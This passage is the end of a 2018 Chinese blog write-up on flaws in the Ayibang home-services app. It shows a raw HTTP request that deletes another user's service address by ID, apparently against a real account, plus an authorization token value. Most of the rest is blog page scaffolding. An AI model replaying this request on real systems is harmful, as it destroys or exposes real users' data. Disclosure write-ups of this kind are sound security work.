+<p><strong>以下为我随便找的一个用户地址（抱歉给这位用户带来困扰）：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17330512 HTTP/1.1</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47</span><br><span class="line">DNT: 1</span><br><span class="line">Accept-Encoding: gzip, deflate, lzma, sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br></pre></td></tr></table></figure></p>
+<p><strong>返回：</strong><br><img src="http://static.zybuluo.com/1kbfree/o4qwyxhj25dogg6q0mc245ma/image_1cg3v85b91grlggsheep5k144b5i.png" alt="image_1cg3v85b91grlggsheep5k144b5i.png-104.3kB"></p>
+<h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><p>如果需要通过浏览器复现上面问题，需要注意数据请求处有一个请求头：<br><code>Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</code><br>此处的authorization是用户在登录APP的时候服务器返回的认证key<br><img src="http://static.zybuluo.com/1kbfree/1esugc3rjsugawvsoapq73j0/image_1cg3vad5f5mr1rjf6j9k5m1fv55v.png" alt="image_1cg3vad5f5mr1rjf6j9k5m1fv55v.png-279.8kB"></p>
+<blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p>
+</blockquote>
+      
+    </div>
+    
+    
+    
+
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2018/06/16/阿姨帮最新APP漏洞大全/">阿姨帮最新APP漏洞大全(支付漏洞/地址/订单遍历/删除等)</a></p>
+
+  
+      <p><span>文章作者:</span><a href="/" title="访问 Iamfree 的博客">Iamfree</a></p>
+      
+          <p><span>作者QQ:</span>1900065568</p>
+      
+
+  
+  
+
+  <p><span>发布时间:</span>2018年06月16日 - 17:06</p>
+  <p><span>最后更新:</span>2018年06月16日 - 17:06</p>
+  <p><span>原始链接:</span><a href="/2018/06/16/阿姨帮最新APP漏洞大全/" title="阿姨帮最新APP漏洞大全(支付漏洞/地址/订单遍历/删除等)">127.0.0.1/2018/06/16/阿姨帮最新APP漏洞大全/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="127.0.0.1/2018/06/16/阿姨帮最新APP漏洞大全/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span>暂时请不要转载,感谢！！！</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+	});
+    });  
+</script>
+
+      
+    </div>
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持写有质量的原创\转载文章，如果您觉得质量不错的话就点击下面按钮打赏我们把~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wx.jpg" alt=" 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zfb.jpg" alt=" 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <div>
+      
+        <div> 
+
+	 
+		<div style="text-align:center;color: #C5B9B9;font-size:14px;">
+			---------------本文结束<i class="fa fa-angellist"></i>感谢您的阅读，喜欢我们的话就加入我们吧~---------------
+		</div> 
+	 
+
+</div>
+
+      
+    </div>
+    
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞挖掘/" rel="tag"><i class="fa fa-tag"></i> 漏洞挖掘</a>
+          
+            <a href="/tags/支付漏洞/" rel="tag"><i class="fa fa-tag"></i> 支付漏洞</a>
+          
+            <a href="/tags/越权漏洞/" rel="tag"><i class="fa fa-tag"></i> 越权漏洞</a>
+          
+            <a href="/tags/Xss漏洞/" rel="tag"><i class="fa fa-tag"></i> Xss漏洞</a>
+          
+            <a href="/tags/密码逻辑漏洞/" rel="tag"><i class="fa fa-tag"></i> 密码逻辑漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/16/暴风魔镜某处设计缺陷可获取整站用户信息/" rel="next" title="暴风魔镜某处设计缺陷可获取整站用户信息(xss/越权/密码逻辑/支付漏洞等)">
+                <i class="fa fa-chevron-left"></i> 暴风魔镜某处设计缺陷可获取整站用户信息(xss/越权/密码逻辑/支付漏洞等)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/16/腾讯某处SSRF漏洞/" rel="prev" title="腾讯某处SSRF漏洞">
+                腾讯某处SSRF漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+<span class="jiathis_txt">分享到：</span>
+<a class="jiathis_button_fav">收藏夹</a>
+<a class="jiathis_button_copy">复制网址</a>
+<a class="jiathis_button_email">邮件</a>
+<a class="jiathis_button_weixin">微信</a>
+<a class="jiathis_button_qzone">QQ空间</a>
+<a class="jiathis_button_tqq">腾讯微博</a>
+<a class="jiathis_button_douban">豆瓣</a>
+<a class="jiathis_button_share">一键分享</a>
+
+<a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+var jiathis_config={
+  data_track_clickback:true,
+  summary:"",
+  shortUrl:false,
+  hideMore:false
+}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/cai_font.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description">一支有梦想的技术团队</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.qq.com" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.weixin.com" target="_blank" title="微信">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>微信</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.baidu.com" target="_blank" title="QQ群">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ群</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://baidu.com/" title="百度" target="_blank">百度</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://baidu.com/" title="QQ" target="_blank">QQ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://baidu.com/" title="微博" target="_blank">微博</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#简要描述："><span class="nav-number">1.</span> <span class="nav-text">简要描述：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#详细说明："><span class="nav-number">2.</span> <span class="nav-text">详细说明：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#支付漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">支付漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-超低价格支付订单"><span class="nav-number">2.1.1.</span> <span class="nav-text">1. 超低价格支付订单</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-点击确认支付抓包并先截断提交："><span class="nav-number">2.1.2.</span> <span class="nav-text">2. 点击确认支付抓包并先截断提交：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#任意用户订单查看"><span class="nav-number">2.2.</span> <span class="nav-text">任意用户订单查看</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#任意用户订单取消漏洞"><span class="nav-number">2.3.</span> <span class="nav-text">任意用户订单取消漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#任意用户服务地址删除"><span class="nav-number">2.4.</span> <span class="nav-text">任意用户服务地址删除</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-点击app里面服务地址"><span class="nav-number">2.4.1.</span> <span class="nav-text">1. 点击app里面服务地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-添加两个地址"><span class="nav-number">2.4.2.</span> <span class="nav-text">2. 添加两个地址</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-删除第一个地址请求数据包如下："><span class="nav-number">2.4.2.1.</span> <span class="nav-text">1. 删除第一个地址请求数据包如下：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞证明"><span class="nav-number">3.</span> <span class="nav-text">漏洞证明</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div> 
+  <span class="post-count"><strong>QQ群 : xxxxxxxxxxxxx</strong></span>
+  <span class="post-meta-divider">|</span>
+</div>
+
+<div class="theme-info">
+  <div class="powered-by"></div> 
+  <span class="post-count">We are is <i>Cai_Team</i>.</span>
+</div>
+
+<br>
+
+<div class="theme-info">
+  <div class="powered-by"></div> 
+  <span class="post-count">博客文章字数共 16.1k 哟~</span>
+</div>
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      此站已有 <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人访问
+    </span>
+  
+
+  
+    <span class="site-pv">
+      此站总访问量 <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '4o0M8wbn5KRpOElHEHQ9xvrm-gzGzoHsz',
+        appKey: 'GXbplAnGtcPsivqGS3OgATet',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
